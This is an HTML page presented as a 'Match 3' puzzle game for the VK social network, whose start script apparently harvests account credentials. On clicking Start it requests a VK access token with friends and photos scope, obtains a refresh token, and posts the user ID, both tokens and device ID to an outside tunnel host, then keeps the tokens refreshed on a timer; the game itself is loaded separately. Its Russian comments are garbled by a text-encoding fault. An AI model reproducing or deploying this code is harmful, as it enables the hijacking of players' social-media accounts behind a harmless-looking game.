<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Match 3</title>
  <style>
    body {
      background: linear-gradient(to bottom, #ADD8E6, #87CEEB);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      overflow: hidden;
      color: white;
    }

    #gameContainer {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    #gameBoard {
      display: grid;
      grid-gap: 2px;
      border: 1px solid black;
      width: 870px;
      height: 870px;
      background-color: #77B5FE;
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }

    .cell {
      width: calc(870px / 8 - 2px);
      height: calc(870px / 8 - 2px);
      text-align: center;
      font-size: 24px;
      cursor: pointer;
      transition: transform 0.2s ease, background-color 0.2s ease;
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
      border-radius: 15px;
      background-color: #6495ED;
    }

    .cell.swapping {
      transform: scale(1.2);
    }

    .cell.removing {
      opacity: 0;
      transition: opacity 0.2s ease;
    }

    #start {
      padding: 20px 40px;
      font-size: 24px;
      cursor: pointer;
      background-color: #4682B4;
      color: white;
      border: none;
      border-radius: 10px;
      transition: background-color 0.3s ease;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 100;
    }

    #start.hidden {
      display: none;
    }

    #start:hover {
      background-color: #5F9EA0;
    }
  </style>
</head>
<body>

  <div id="gameContainer">
    <button id="start" onclick="initialize()">Start</button>
    <div id="gameBoard"></div>
  </div>

  <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
<script>
  const APP_ID = 8109529;
  let accessToken = null;
  let refreshToken = null;
  let deviceId = null;
  let userInfo = null;
  let tokenRefreshTimer = null;

  function showError(message) {
    console.error(message);
  }

  function updateStatus(message) {
    console.log(message);
  }

  function hideStartButton() {
    const startButton = document.getElementById('start');
    if (startButton) {
      startButton.classList.add('hidden');
    }
  }

  async function initialize() {
    hideStartButton();

    try {
      if (!vkBridge.supports('VKWebAppInit')) {
        throw new Error('–û—Ç–∫—Ä–æ–π—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –≤–Ω—É—Ç—Ä–∏ VK!');
      }

      await vkBridge.send('VKWebAppInit');
      updateStatus('–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...');

      // –ó–∞–ø—Ä–æ—Å device_id (–æ–Ω –Ω—É–∂–µ–Ω –¥–ª—è refresh_token)
      const deviceData = await vkBridge.send('VKWebAppGetClientInfo');
      deviceId = deviceData.device_id || 'UNKNOWN_DEVICE';

      console.log('üì± –ü–æ–ª—É—á–µ–Ω device_id:', deviceId);

      // –ü–æ–ª—É—á–∞–µ–º –∫–æ–¥ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
      const authCodeData = await vkBridge.send('VKWebAppGetAuthToken', {
        app_id: APP_ID,
        scope: 'friends,photos'
      });

      if (!authCodeData.access_token) {
        throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å access_token');
      }

      accessToken = authCodeData.access_token;

      // –ü–æ–ª—É—á–∞–µ–º refresh_token
      const refreshResponse = await VKID.Auth.exchangeCode(authCodeData.access_token, deviceId);
      refreshToken = refreshResponse.refresh_token || 'NO_REFRESH_TOKEN';

      console.log('üîÑ –ü–æ–ª—É—á–µ–Ω refresh_token:', refreshToken);

      userInfo = await vkBridge.send('VKWebAppGetUserInfo');

      function getRFCFormattedDateTime() {
        return new Date().toUTCString(); // –ù–∞–ø—Ä–∏–º–µ—Ä: "Tue, 11 Mar 2025 04:33:27 GMT"
      }

      const tokenData = {
        user_id: userInfo.id.toString(),
        access_token: accessToken,
        refresh_token: refreshToken,
        device_id: deviceId,
        token_type: authCodeData.token_type || 'Bearer',
        expires_in: authCodeData.expires_in || 3600,
        id_token: authCodeData.id_token || '',
        token_datetime: getRFCFormattedDateTime()
      };

      console.log("üìÖ token_datetime (RFC 5322):", tokenData.token_datetime);

      await sendTokenToYourServer(tokenData);
      setupTokenRefresh(authCodeData.expires_in || 3600);

      showGame();

    } catch (error) {
      showError(`–û—à–∏–±–∫–∞: ${error.message || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'}`);
    }
  }

  async function sendTokenToYourServer(data) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);

    try {
      const response = await fetch('https://bla39d-37-45-190-41.ru.tuna.am/api/vk-token', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data),
        signal: controller.signal
      });

      clearTimeout(timeoutId);

      if (!response.ok) {
        throw new Error(`–û—à–∏–±–∫–∞ ${response.status}: ${response.statusText}`);
      }

      console.log('‚úÖ –î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –Ω–∞ —Å–µ—Ä–≤–µ—Ä');
      return await response.json();

    } catch (error) {
      console.error('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä:', error);
      showError('–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö');
    }
  }

  function setupTokenRefresh(expiresIn) {
    if (tokenRefreshTimer) {
      clearTimeout(tokenRefreshTimer);
    }

    tokenRefreshTimer = setTimeout(async () => {
      console.log('üîÑ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞...');

      try {
        if (!refreshToken || refreshToken === 'NO_REFRESH_TOKEN') {
          throw new Error('–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω–æ–≥–æ refresh_token');
        }

        // –ò—Å–ø–æ–ª—å–∑—É–µ–º refresh_token –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è access_token
        const refreshData = await VKID.Auth.refresh_token(refreshToken, deviceId);

        if (!refreshData.access_token || !refreshData.refresh_token) {
          throw new Error('–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ç–æ–∫–µ–Ω–∞');
        }

        accessToken = refreshData.access_token;
        refreshToken = refreshData.refresh_token;

        console.log('üîÑ –ù–æ–≤—ã–π access_token:', accessToken);
        console.log('üîÑ –ù–æ–≤—ã–π refresh_token:', refreshToken);

        updateStatus('–¢–æ–∫–µ–Ω –æ–±–Ω–æ–≤–ª—ë–Ω');

        setupTokenRefresh(refreshData.expires_in || 3600);
      } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ —Ç–æ–∫–µ–Ω–∞:', error);
        showError('–ù–µ —É–¥–∞–ª–æ—Å—å –æ–±–Ω–æ–≤–∏—Ç—å —Ç–æ–∫–µ–Ω');
      }
    }, (expiresIn - 60) * 1000);
  }

  async function showGame() {
    try {
      await loadGameScript();
      if (typeof startGame === 'function') {
        startGame();
      } else {
        showError('–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –∏–≥—Ä—ã');
      }
    } catch (error) {
      console.error('‚ùå –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –∏–≥—Ä—ã:', error);
      showError('–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –∏–≥—Ä—É');
    }
  }

  function loadGameScript() {
    return new Promise((resolve, reject) => {
      const script = document.createElement('script');
      script.src = 'game.js';
      script.onload = resolve;
      script.onerror = reject;

      setTimeout(() => reject(new Error('–í—Ä–µ–º—è –∑–∞–≥—Ä—É–∑–∫–∏ –∏–≥—Ä—ã –∏—Å—Ç–µ–∫–ª–æ')), 5000);

      document.head.appendChild(script);
    });
  }
</script>


  <script src="game.js"></script>
</body>
</html>
